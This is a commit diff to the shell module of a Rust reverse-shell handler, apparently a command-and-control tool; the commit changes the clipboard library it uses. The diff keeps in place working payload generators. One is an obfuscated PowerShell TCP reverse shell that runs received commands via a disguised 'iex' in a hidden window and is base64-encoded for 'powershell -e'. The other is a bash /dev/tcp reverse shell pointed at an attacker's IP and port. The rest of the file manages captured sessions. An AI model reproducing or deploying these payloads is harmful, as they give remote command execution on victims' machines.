e759d4a6938dce3c857bc271205b3b8e69c91d9a
Jsmoreira02 <supermetal344@gmail.com>
2024-12-06 08:02:15 -0300

    Source Code | replaced clippers with cli-clipboard

--- src/shell.rs
+++ src/shell.rs
@@ -1,8 +1,9 @@
 use server_core::Server;
 use std::sync::Arc;
 use std::io::{self, Write};
-use std::net::Shutdown;
+use std::net::{IpAddr, Shutdown};
 use rustyline::Editor;
+use cli_clipboard::{ClipboardContext, ClipboardProvider}; // Alterado para usar cli-clipboard
 
 use base64::{engine::general_purpose, Engine as _};
 use local_ip_address::local_ip;
@@ -15,26 +16,24 @@ static PAYLOAD_LINUX: &str = r#""#;    /*You can create your own custom payload 
 /*Create Custom Payloads */
 
 pub fn generate_payload(ip: &str, port: &str, os: &str) -> String {
-
-    let ip_address: std::net::IpAddr;
-    let mut clipboard: clippers::Clipboard = clippers::Clipboard::get();
+    
+    let ip_address: IpAddr;
+    let mut clipboard = ClipboardContext::new().expect("Failed to initialize clipboard"); // Inicializa o ClipboardContext
 
     if ip == "0.0.0.0" || ip == "127.0.0.1" {
         ip_address = local_ip().unwrap();
-    }
-    else {
+    } else {
         ip_address = ip.parse().unwrap();
     }
 
     println!("\n\x1b[38;5;11mThe payload has been copied to the clipboard....\x1b[0m\n");
 
     match os {
-
         "Windows" | "windows" => {
 
             if PAYLOAD_WINDOWS.is_empty() {
-             
-                let plain_payload: String = format!(
+            
+                let plain_payload = format!(
                     r#"Start-Process $PSHOME\powershell.exe -ArgumentList {{$var9876543210=New-Object System.Net.Sockets.TCPClient('{}',{});$var1234567890=$var9876543210.GetStream();[byte[]]$var112233445566=0..65535|%{{0}};while(($var9988776655=$var1234567890.Read($var112233445566,0,$var112233445566.Length))-ne0){{ $var5566778899=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($var112233445566,0,$var9988776655);$var4433221100=(i""e''x $var5566778899 2>&1|Out-String);$var4455667788=$var4433221100+'PS '+ {} + '> ';$var2244668800=([text.encoding]::ASCII).GetBytes($var4455667788);$var1234567890.Write($var2244668800,0,$var2244668800.Length);$var1234567890.Flush();}};$var9876543210.Close()}} -WindowStyle Hidden"#,
                     ip_address, port, "$pwd"
                 );
@@ -44,38 +43,37 @@ pub fn generate_payload(ip: &str, port: &str, os: &str) -> String {
 
                 for code_point in utf16 {
                     utf16_bytes.push((code_point & 0xFF) as u8);
-                    utf16_bytes.push((code_point >> 8) as u8); 
+                    utf16_bytes.push((code_point >> 8) as u8);
                 }
 
                 let payload = format!("powershell -e {}\n", general_purpose::STANDARD.encode(utf16_bytes));
-                clipboard.write_text(&payload).unwrap();
-
+                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+            
                 return payload.clone();
-            }
+            } 
             else {
-                let _ = clipboard.write_text(&PAYLOAD_WINDOWS);
-
+                clipboard.set_contents(PAYLOAD_WINDOWS.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+        
                 return PAYLOAD_WINDOWS.to_string();
             }
-        },
-
+        }
         "Linux" | "linux" => {
 
             if PAYLOAD_LINUX.is_empty() {
-                
                 let payload = format!("0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196", ip_address, port);
-                clipboard.write_text(&payload).unwrap();
-
+                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+             
                 return payload.clone();
-            }
+            } 
             else {
-                let _ = clipboard.write_text(&PAYLOAD_LINUX);
-
+                clipboard.set_contents(PAYLOAD_LINUX.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+             
                 return PAYLOAD_LINUX.to_string();
             }
-        },
-
-        _ => { return "\n[\x1b[32;1mX\x1b[0m] Not supported!\n".to_string() },
+        }
+        _ => {
+            return "\n[\x1b[32;1mX\x1b[0m] Not supported!\n".to_string();
+        }
     }
 }
 
@@ -85,7 +83,7 @@ pub fn connect_to_shell(server: &Server, id: &str) {
 
     if let Some(connection) = connections.get_mut(id) {
         if connection.active && !connection.suspended {
-        
+            
             let mut stream_clone_for_commands: std::net::TcpStream = connection.stream.try_clone().unwrap();
             let id_cloned: String = id.to_string();
             let stdout_mutex: Arc<std::sync::Mutex<()>> = Arc::clone(&server.stdout_mutex);
@@ -98,23 +96,22 @@ pub fn connect_to_shell(server: &Server, id: &str) {
                 io::stdout().flush().unwrap();
             }
             
-            {   
+            {
                 stream_clone_for_commands.write_all(format!("\n").as_bytes()).unwrap();
                 stream_clone_for_commands.flush().unwrap();
             }
 
             loop {
-                
                 let readline: Result<String, rustyline::error::ReadlineError> = rl.readline("");
 
                 match readline {
                     Ok(command) => {
-
+            
                         let _ = rl.add_history_entry(command.as_str());
                         let command = command.trim();
                         
                         if command == "exit" {
-                    
+                        
                             stream_clone_for_commands.shutdown(Shutdown::Both).unwrap();
                             connection.active = false;
 
@@ -126,8 +123,8 @@ pub fn connect_to_shell(server: &Server, id: &str) {
 
                             break;
                         } 
-                        else if command == "suspend" {    
-                            
+                        else if command == "suspend" {
+                        
                             connection.suspended = true;
 
                             {
@@ -137,9 +134,9 @@ pub fn connect_to_shell(server: &Server, id: &str) {
                             }
 
                             break;
-                        }
+                        } 
                         else {
-                            
+                        
                             if command.is_empty() {
                                 stream_clone_for_commands.flush().unwrap();
                             } 
@@ -155,22 +152,22 @@ pub fn connect_to_shell(server: &Server, id: &str) {
             }
         } 
         else if connection.suspended {
-            
             let _lock: std::sync::MutexGuard<'_, ()> = server.stdout_mutex.lock().unwrap();
             println!("\x1b[34;1m[!]\x1b[0m Session {} is Suspended", id);
+        
             io::stdout().flush().unwrap();
         } 
         else {
-            
             let _lock: std::sync::MutexGuard<'_, ()> = server.stdout_mutex.lock().unwrap();
             println!("\x1b[31;1m[X]\x1b[0m Session {} is not Active", id);
+        
             io::stdout().flush().unwrap();
         }
     } 
     else {
-        
         let _lock: std::sync::MutexGuard<'_, ()> = server.stdout_mutex.lock().unwrap();
         println!("\x1b[31;1m[X]\x1b[0m No Session with ID={} was found!", id);
+    
         io::stdout().flush().unwrap();
     }
 }
